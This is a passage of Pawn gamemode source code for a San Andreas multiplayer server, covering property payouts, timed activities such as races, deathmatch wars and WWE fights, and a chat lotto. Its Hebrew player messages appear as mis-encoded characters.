			automsg(lightblue," ~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
			adauto = 0;
			#undef automsg
		}
	}
	#if lagtest
		LagTest_End("AutoMessage");
	#endif
	if(debugstate) printf("AutoMessage end");
	return 1;
}
//=[PropertiesPay]==============================================================
public PropertiesPay()
{
	if(debugstate) printf("PropertiesPay start");
	#if lagtest
		LagTest_Start("PropertiesPay");
	#endif
	new string[M_S], pay[MAX_PLAYERS] = {0,...}, Float:payWithPercent = 0;
	for(new i = 0, c = 0; i < MAX_PLAYERS_; i++)
	{
		if(IsPlayerConnected(i) && !playerinfo[i][inhq] && !IsPlayerAFK_(i) && !(GetPlayerState(i) != PLAYER_STATE_ONFOOT && GetVehicleType(GetPlayerVehicleID(i)) == 5) && IsPlayerInArea(i,-2989.536,-2954.502,2977.858,2977.858) && !GetPlayerInterior(i) && !GetPlayerVirtualWorld(i) && GetPlayerCheckpoint(i) == cp_none && GetPlayerState(i) != PLAYER_STATE_PASSENGER)
		{
			c = playerinfo[i][propscount];
			for(new p=0;p<props;p++) if(propinfo[p][owner] == i && !propinfo[p][spid])
			{
				playerinfo[i][earns][p]--;
				format(string,sizeof(string),"/DM/Properties/%d.ini",p);
				if(!playerinfo[i][earns][p])
				{
					fsetstring(string,"Owner","None");
					fsetint(string,"LeftEarns",prop_earns);
					fsetint(string,"BoughtCost",0);
					propinfo[p][owner] = INVALID_PLAYER_ID, playerinfo[i][earns][p] = 0, playerinfo[i][propscount]--;
					format(string,sizeof(string)," .хьыя фхр ыс° ьр ∙щщъ ьъ %s Єу ыф ўщсь· %d ю∙ых°х· юфЁыё",propinfo[p][pname],prop_earns);
					SendClientMessage(i,red,string);
					UpdatePropertyText(p);
				}
				else
				{
					pay[i] += propper(propinfo[p][pearning]);
					fsetint(string,"LeftEarns",playerinfo[i][earns][p]);
				}
			}
			if(pay[i] > 0 && c > 0)
			{
				payWithPercent = pay[i] + (pay[i] * (VIP_PropertyPercentAdditions[playerinfo[i][vip]] / 100.0));
                new lastpay = ((headserver == i) ? 2 : 1) * floatround(payWithPercent,floatround_round);
				format(string,sizeof(string)," * .ф°ххч· " @c(lightgreen) "%d$" @c(green) " %s ∙с°∙х·ъ", lastpay, c == 1 ? ("юфЁыё") : ("юфЁыёщэ"));
				SendClientMessage(i,green,string);
				GiveMoney(i,lastpay,38);
			}
		}
	}
	#if lagtest
		LagTest_End("PropertiesPay");
	#endif
	if(debugstate) printf("PropertiesPay end");
	return 1;
}
//=[StartActivity]==============================================================
public StartActivity()
{
	if(debugstate) printf("Gamemode Activity [start]: StartActivity");
	#if lagtest
		LagTest_Start("StartActivity");
	#endif
	if(thereIsAct) return 0;
	new n = 13, mx = n+sizeof(warGames)+sizeof(ManhuntTypes)+sizeof(SRaceTypes)+sizeof(TeamActivities), rnd = randomEx(1,mx);
	switch(rnd)
	{
		case 1: StartRace(99,99);
		case 2: StartWar();
		case 3: StartWWE();
		case 4: StartKart();
		case 5: StartMonster();
		case 6: StartKickstar();
		case 7: StartEWar();
		case 8: StartZombies();
		case 9: StartSport(1/*randomEx(1,3)*/);
		case 10: StartGlass();
		case 11: StartArmy(randomEx(1,sizeof(army)+1));
		case 12: StartBriefcase();
		default:
		{
			if(rnd >= n && rnd < n+sizeof(warGames)) StartWarGame(random(sizeof(warGames)));
			if(rnd >= n+sizeof(warGames) && rnd < n+sizeof(warGames)+sizeof(ManhuntTypes)) StartManhunt(random(sizeof(ManhuntTypes)));
			if(rnd >= n+sizeof(warGames)+sizeof(ManhuntTypes) && rnd < n+sizeof(warGames)+sizeof(ManhuntTypes)+sizeof(SRaceTypes)) StartSRace(random(sizeof(SRaceTypes)));
			if(rnd >= n+sizeof(warGames)+sizeof(ManhuntTypes)+sizeof(SRaceTypes) && rnd < mx) StartTeamActivity(random(sizeof(TeamActivities)));
		}
	}
	#if lagtest
		LagTest_End("StartActivity");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartActivity");
	return 1;
}
//=[StartRace]==================================================================
public StartRace(racetype,raceway)
{
	if(debugstate) printf("Gamemode Activity [start]: StartRace");
	#if lagtest
		LagTest_Start("StartRace");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	raceinfo[0] = 1, raceinfo[1] = 0, raceinfo[2] = 60, raceinfo[5] = 3;
	raceinfo[3] = SetTimer("StartRace2",1000,1);
	raceinfo[4] = (racetype == 99 ? random(5) : racetype);
	raceinfo[6] = (raceway == 99 ? randomEx(1,GetRaceMaxStyles(raceinfo[4])) : raceway);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	if(raceinfo[4] == race1_cars) SendClientMessageToAll(green," (/Race /Drifts :ющ°хї " @c(lightgreen) "юыхЁщх·" @c(green) " щ·чщь сЄху уўф! (юЎрх юыхЁщ· с");
	else if(raceinfo[4] == race2_bikes) SendClientMessageToAll(green," (/Ramp /StuntsTele :ющ°хї " @c(lightgreen) "рхЇЁхЄщэ" @c(green) " щ·чщь сЄху уўф! (юЎрх рхЇЁхЄ с");
	else if(raceinfo[4] == race3_planes) SendClientMessageToAll(green," (/AP /AS :ющ°хї " @c(lightgreen) "юшхёщэ" @c(green) " щ·чщь сЄху уўф! (юЎрх юшхё с");
	else if(raceinfo[4] == race4_boats) SendClientMessageToAll(green," (/Ships /Docks :ющ°хї " @c(lightgreen) "ёщ°х·" @c(green) " щ·чщь сЄху уўф! (юЎрх ёщ°ф с");
	else if(raceinfo[4] == race5_crazy) SendClientMessageToAll(green," !ющ°хї " @c(lightgreen) "ю∙хтЄ" @c(green) " щ·чщь сЄху уўф");
	else if(raceinfo[4] == race6_tires) SendClientMessageToAll(green," !ющ°хї " @c(lightgreen) "ЇрЁЎ'°щэ" @c(green) " щ·чщь сЄху уўф");
	else if(raceinfo[4] == race7_invcars) SendClientMessageToAll(green," !ющ°хї " @c(lightgreen) "юыхЁщх· сь·щ Ё°рх·" @c(green) " щ·чщь сЄху уўф");
	else if(raceinfo[4] == race8_waterdrive) SendClientMessageToAll(green," !ющ°хї " @c(lightgreen) "юыхЁщх· Єь фющэ" @c(green) " щ·чщь сЄху уўф");
	if(raceinfo[4] >= race7_invcars) SendClientMessageToAll(red," !сьсу SAMP-IL Guard ющ°хї цф ющхЄу ью∙·ю∙щ");
	SendClientMessageToAll(green," /join рх /racing join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьющ°хї Єхьф $" #join_act "$ хфЇ°ё ьюўхэ ф°р∙хя фхр " #actprize_race1 "$");
	format(string,sizeof(string)," юёьхь юёЇ°: %d",raceinfo[6]);
	SendClientMessageToAll(green,string);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~y~racing~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartRace");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartRace");
	return 1;
}
//=[StartRace2]=================================================================
public StartRace2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartRace2");
	#if lagtest
		LagTest_Start("StartRace2");
	#endif
	new string[M_S], v;
	raceinfo[2]--;
	if(raceinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(raceinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~y~Race: ~h~%d~n~~y~(%d/%d)",raceinfo[2],raceinfo[1],GetRaceSpawnsCount());
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(raceinfo[2] == 15 || raceinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :фющ°хї щ·чщь сЄху %d ∙Ёщх·, фЎш°Їх Єы∙щх",raceinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(raceinfo[2] == 3)
	{
		if(raceinfo[1] < 3) return EndRace("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю3",-1);
		new spa = GetRaceSpawnsCount(), maxcp = (GetRaceCheckpointsCount() + 1) - spa, int = 0;
		raceinfo[7] = SetTimer("DuringRace",10,1), raceinfo[8] = spa;
		#pragma unused maxcp
		#define racesync(%1,%2) if(raceinfo[6] == %2) SetVehiclePos(v,RacePositions_%1%2[id][0],RacePositions_%1%2[id][1],RacePositions_%1%2[id][2],i), SetVehicleZAngle(v,RacePositions_%1%2[id][3])
		#define racetest(%1,%2) if(raceinfo[6] == %2) SetPlayerRaceCheckpoint(i,0,RacePositions_%1%2[spa][0],RacePositions_%1%2[spa][1],RacePositions_%1%2[spa][2],RacePositions_%1%2[spa+1][0],RacePositions_%1%2[spa+1][1],RacePositions_%1%2[spa+1][2],20.0)
		raceplayers = 0;
		for(new i=0,id=0,ds[4];i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitrace])
			{
				raceplayer[raceplayers++] = i;
				ResetWeapons(i);
				id = playerinfo[i][raceid];
				playerinfo[i][racemaxcp] = maxcp;
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				v = GetPlayerVehicleID(i);
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy, race6_tires, race7_invcars:
					{
						racesync(cars,1);
						racesync(cars,2);
						racesync(cars,3);
						racesync(cars,4);
						racesync(cars,5);
					}
					case race2_bikes:
					{
						racesync(bikes,1);
						racesync(bikes,2);
						racesync(bikes,3);
						racesync(bikes,4);
						racesync(bikes,5);
					}
					case race3_planes:
					{
						racesync(planes,1);
						racesync(planes,2);
						racesync(planes,3);
					}
					case race4_boats, race8_waterdrive:
					{
						racesync(boats,1);
						racesync(boats,2);
					}
				}
				CallRemoteFunction("AllowPrizeUsing","ii",i,0);
				SetVehicleVirtualWorld(v,world_race);
				if((raceinfo[4] == race1_cars || raceinfo[4] == race5_crazy || raceinfo[4] == race6_tires || raceinfo[4] == race7_invcars) && raceinfo[6] == 4) int = 7;
				else if(raceinfo[4] == race2_bikes && raceinfo[6] == 5) int = 4;
				else int = 0;
				if(raceinfo[4] == race6_tires)
				{
					GetVehicleDamageStatus(v,ds[0],ds[1],ds[2],ds[3]);
					UpdateVehicleDamageStatus(v,ds[0],ds[1],ds[2],0b0000);
				}
				if(raceinfo[4] == race7_invcars && IsPlayerUsingSGuard_(i)) EnableGameCheat(i,CHEAT_INVISIBLECARS,true);
				if(raceinfo[4] == race8_waterdrive && IsPlayerUsingSGuard_(i)) EnableGameCheat(i,CHEAT_DRIVEONWATER,true);
				LinkVehicleToInterior(v,int);
				SetPlayerInterior(i,int);
				SetPlayerVirtualWorld(i,world_race);
				SetPlayerTeam(i,NO_TEAM);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				SetCameraBehindPlayer(i);
				vehicleinfo[v][racedriver] = i;
				playerinfo[i][racecp] = spa;
				RaceTextDraw(i,"create");
				PlaySound(i,1097);
				SetFreeze(i,1);
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy, race6_tires, race7_invcars:
					{
						racetest(cars,1);
						else racetest(cars,2);
						else racetest(cars,3);
						else racetest(cars,4);
						else racetest(cars,5);
					}
					case race2_bikes:
					{
						racetest(bikes,1);
						else racetest(bikes,2);
						else racetest(bikes,3);
						else racetest(bikes,4);
						else racetest(bikes,5);
					}
					case race3_planes:
					{
						racetest(planes,1);
						else racetest(planes,2);
						else racetest(planes,3);
					}
					case race4_boats, race8_waterdrive:
					{
						racetest(boats,1);
						else racetest(boats,2);
					}
				}
				SendClientMessage(i,orange," !сфЎьчф сющ°хї");
				playerinfo[i][inact] = 1;
			}
		}
	}
	#undef racesync
	#undef racetest
	if(raceinfo[2] == 0)
	{
		for(new i = 0, Float:p[3]; i < MAX_PLAYERS_; i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitrace])
			{
				playerinfo[i][inrace] = 1, playerinfo[i][waitrace] = 0;
				SetFreeze(i,0);
				if(raceinfo[4] == race8_waterdrive)
				{
					GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
					SetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]+3.0);
				}
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ ЇЄщьх· рхшхюшщ· ] Х Х Х Х Х");
		format(string,sizeof(string)," фющ°хї ф·чщь! юёЇ° ю∙··Їщэ: %d",raceinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(raceinfo[3]);
	}
	#if lagtest
		LagTest_End("StartRace2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartRace2");
	return 1;
}
//=[DuringRace]=================================================================
public DuringRace()
{
	if(debugstate) printf("Gamemode Activity [start]: DuringRace");
	#if lagtest
		LagTest_Start("DuringRace");
	#endif
	for(new i = 0; i < raceplayers; i++) if(playerinfo[raceplayer[i]][inrace] && IsPlayerConnected(raceplayer[i]))
	{
		playerinfo[raceplayer[i]][racerecord][0]++;
		if(playerinfo[raceplayer[i]][racerecord][0] >= 100)
		{
			playerinfo[raceplayer[i]][racerecord][0] = 0, playerinfo[raceplayer[i]][racerecord][1]++;
			if(playerinfo[raceplayer[i]][racerecord][1] >= 60) playerinfo[raceplayer[i]][racerecord][2]++, playerinfo[raceplayer[i]][racerecord][1] = 0;
		}
		RaceTextDraw(raceplayer[i],"update");
	}
	#if lagtest
		LagTest_End("DuringRace");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: DuringRace2");
	return 1;
}
//=[EndDuel]====================================================================
forward EndDuel(playerid, id);
public EndDuel(playerid, id)
{
	if(!playerinfo[playerid][inbattle] || !playerinfo[id][inbattle]) return 1;
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	if(playerinfo[playerid][battlex] != x || playerinfo[playerid][battley] != y || playerinfo[playerid][battlez] != z) return 1;
	SendClientMessage(playerid,green," .щЎр· юфў°с");
	new string[M_S];
	format(string,sizeof(string)," .щщЎр юфў°с, ЁщЎчхя шыЁщ ьъ %s",GetName(playerid));
	SendClientMessage(id,green,string);
	SetPlayerVirtualWorld(playerid,world_normal);
	SetPlayerVirtualWorld(id,world_normal);
	ResetWeapons(playerid);
	SpawnPlayer(playerid);
	ResetWeapons(id);
	SpawnPlayer(id);
	playerinfo[id][inbattle] = 0, playerinfo[id][binvited] = -1;
	playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1;
	return 1;
}
//=[StartWar]===================================================================
public StartWar()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWar");
	#if lagtest
		LagTest_Start("StartWar");
	#endif
	if(thereIsAct) return 0;
	warinfo[0] = 1, warinfo[1] = 0, warinfo[2] = 60, warinfo[3] = SetTimer("StartWar2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !юьчю· ∙°· ··чщь сЄху уўф! схрх ьсчхя р· щыхьх·щыэ сЁ∙ўщэ");
	SendClientMessageToAll(green," /join рх /swar join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьюьчю· ф∙°· Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_swar "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~r~war~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartWar");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartWar");
	return 1;
}
//=[StartWar2]==================================================================
public StartWar2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWar2");
	#if lagtest
		LagTest_Start("StartWar2");
	#endif
	new string[M_S];
	warinfo[2]--;
	if(warinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(warinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~War: ~h~%d~n~~r~(%d/%d)",warinfo[2],warinfo[1],sizeof(WarPositions_1));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(warinfo[2] == 10 || warinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :фюьчюф ··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх·",warinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(warinfo[2] == 3)
	{
		if(warinfo[1] < 2) return EndWar("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0,id=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwar])
			{
				SetFreeze(i,1);
				id = playerinfo[i][warid];
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				SetPlayerPos(i,WarPositions_1[id][0],WarPositions_1[id][1],WarPositions_1[id][2]);
				SetPlayerFacingAngle(i,WarPositions_1[id][3]);
				SetPlayerInterior(i,16);
				SetPlayerVirtualWorld(i,world_war);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,100.0);
				ResetWeapons(i);
				id = warweapons[random(sizeof(warweapons))];
				GiveWeapon(i,id,10000);
				format(string,sizeof(string),"~r~%s",WeaponName(id));
				GameTextForPlayer(i,string,5000,1);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !сфЎьчф сюьчю· ф∙°·");
				PlaySound(i,1083);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(warinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwar])
			{
				playerinfo[i][inwar] = 1, playerinfo[i][waitwar] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," юьчю· ф∙°· ф·чщьф! юёЇ° фю∙··Їщэ: %d",warinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(warinfo[3]);
		warinfo[3] = SetTimer("CheckWar",30000,1);
	}
	#if lagtest
		LagTest_End("StartWar2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartWar2");
	return 1;
}
//=[CheckWar]===================================================================
public CheckWar()
{
	#if lagtest
		LagTest_Start("CheckWar");
	#endif
	for(new i = 0, r = 0, string[64]; i < MAX_PLAYERS_; i++)
	{
		if(IsPlayerConnected(i) && playerinfo[i][inwar])
		{
			ResetWeapons(i);
			r = warweapons[random(sizeof(warweapons))];
			GiveWeapon(i,r,10000);
			format(string,sizeof(string),"~r~%s",WeaponName(r));
			GameTextForPlayer(i,string,5000,1);
		}
	}
	#if lagtest
		LagTest_End("CheckWar");
	#endif
	return 1;
}
//=[StartWWE]===================================================================
public StartWWE()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWWE");
	#if lagtest
		LagTest_Start("StartWWE");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	wweinfo[0] = 1, wweinfo[1] = 0, wweinfo[2] = 30, wweinfo[3] = SetTimer("StartWWE2",1000,1);
	if(wweinfo[4] == -1) wweinfo[4] = random(3);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху ычЎщ уўф WWE ·ч°х·");
	SendClientMessageToAll(green," /join рх /wwe join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_wwe "$ WWE фЎш°Їх· ь·ч°х· ф");
	format(string,sizeof(string)," #%d :цщ°· ў°с юёЇ°",wweinfo[4] + 1);
	SendClientMessageToAll(green,string);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~b~wwe~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartWWE");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartWWE");
	return 1;
}
//=[StartWWE2]==================================================================
public StartWWE2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWWE2");
	#if lagtest
		LagTest_Start("StartWWE2");
	#endif
	new string[M_S];
	wweinfo[2]--;
	if(wweinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(wweinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~WWE: ~h~%d~n~~b~(%d/2)",wweinfo[2],wweinfo[1]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(wweinfo[2] == 10)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· WWE ·ч°х· ф",wweinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(wweinfo[2] == 3)
	{
		if(wweinfo[1] < 2) return EndWWE("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0,n=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwwe])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				ResetWeapons(i);
				n = (!wweinfo[4] ? 0 : (wweinfo[4] == 1 ? 2 : 4)) + playerinfo[i][wweid];
				SetPlayerPos(i,WWEPositions[n][0],WWEPositions[n][1],WWEPositions[n][2]);
				SetPlayerFacingAngle(i,WWEPositions[n][3]);
				SetPlayerInterior(i,WWEInteriors[wweinfo[4]]);
				SetPlayerVirtualWorld(i,world_wwe);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,0.0);
				SetFreeze(i,1);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetCameraBehindPlayer(i);
				PlaySound(i,1068);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(wweinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwwe])
			{
				playerinfo[i][inwwe] = 1, playerinfo[i][waitwwe] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d WWE-·ч°х· ф",wweinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(wweinfo[3]);
		wweinfo[3] = SetTimer("CheckWWE",1000,1);
	}
	#if lagtest
		LagTest_End("StartWWE2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: CheckWWE");
	return 1;
}
//=[CheckWWE]===================================================================
public CheckWWE()
{
	if(debugstate) printf("Gamemode Activity [start]: CheckWWE");
	#if lagtest
		LagTest_Start("CheckWWE");
	#endif
	if(!wweinfo[5] && !random(4))
	{
		new Float:p[3], rnd, weaps[] = {333,334,335,336,337,338,325,326};
		if(wweinfo[4] == 1) rnd = random(sizeof(WWEPickups1)), p[0] = WWEPickups1[rnd][0], p[1] = WWEPickups1[rnd][1], p[2] = WWEPickups1[rnd][2];
		else if(wweinfo[4] == 2) rnd = random(sizeof(WWEPickups2)), p[0] = WWEPickups2[rnd][0], p[1] = WWEPickups2[rnd][1], p[2] = WWEPickups2[rnd][2];
		else if(wweinfo[4] == 3) rnd = random(sizeof(WWEPickups3)), p[0] = WWEPickups3[rnd][0], p[1] = WWEPickups3[rnd][1], p[2] = WWEPickups3[rnd][2];
		wweinfo[5] = CreatePickupEx(weaps[random(sizeof(weaps))],2,p[0],p[1],p[2],25,world_wwe);
		wweinfo[6] = 7;
	}
	if(wweinfo[5] > 0 && wweinfo[6] > 0)
	{
		wweinfo[6]--;
		if(!wweinfo[6])
		{
			DestroyPickupEx(wweinfo[5]);
			wweinfo[5] = 0;
		}
	}
	#if lagtest
		LagTest_End("CheckWWE");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: CheckWWE");
	return 1;
}
//=[UnFreeze]===================================================================
public UnFreeze(playerid, use)
{
	if(!use) return playerinfo[playerid][inbattle] || playerinfo[playerid][indrift] || playerinfo[playerid][inprace] ? 1 : (SetFreeze(playerid,0), 1);
	else if(use == 1) SetFreeze(playerid, 0);
	return 1;
}
//=[StartActivity2]=============================================================
public StartActivity2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartActivity2");
	#if lagtest
		LagTest_Start("StartActivity2");
	#endif
	new rnd = randomEx(specialActivity == sa_dlotto ? 1 : 0,5);
	switch(rnd)
	{
		case 0: Lotto();
		case 1: Math();
		case 2: Trivia();
		case 3: Replytest();
		case 4: WoL();
	}
	#if lagtest
		LagTest_End("StartActivity2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartActivity2");
	return 1;
}
//=[Lotto]======================================================================
public Lotto()
{
	if(debugstate) printf("Gamemode Activity [start]: Lotto");
	#if lagtest
		LagTest_Start("Lotto");
	#endif
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х [ " @c(lightyellow) "ЇЄщьх· Ў'рш" @h(FAEAA9) " ] Х Х Х Х Х");
	SendClientMessageToAll(lightblue," !фт°ь· фьхшх ю·чщьф Єы∙щх! ф∙°· фт°щь юёЇ° сщя 1 ь 50");
	SendClientMessageToAll(green," /lotto [1-50] :Ёёх р· юцьыэ");
	SendClientMessageToAll(orange," Х !ющ ∙щЁч∙ Ёыхя р· фюёЇ° щцыф сёыхэ ыёє рў°рщ сщя 5000$ ь-12000$");
	SendClientMessageToAll(orange," Х /bonus :°хЎф ьфтущь р· ёщыхщщъ ьцых·? сч° схЁхё");
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	lottonum[0] = randomEx(1,51);
	chatacttimer = SetTimer("Lotto2",30000,0);
	CActID = 0;
	#if lagtest
		LagTest_End("Lotto");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Lotto");
	return 1;
}
//=[Lotto2]=====================================================================
public Lotto2()
{
	if(debugstate) printf("Gamemode Activity [start]: Lotto2");
	#if lagtest
		LagTest_Start("Lotto2");
	#endif
	new string[M_S];
	if(lottonum[1] == -1 || !IsPlayerConnected(lottonum[1]))
	{
		format(string,sizeof(string)," .рє рчу ьр цыф сьхшх! фюёЇ° фщф %d",lottonum[0]);
		SendClientMessageToAll(red,string);
	}
	else
	{
		new pay = 5000 + (500 * random(15));
		SendClientMessage(lottonum[1],green," !!!фЁщчх∙ ∙ьъ Ёыхя");
		format(string,sizeof(string)," !цыф сьхшх хўщсь %d$ %s",pay,GetName(lottonum[1]));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string)," .фюёЇ° фщф %d",lottonum[0]);
		SendClientMessageToAll(green,string);
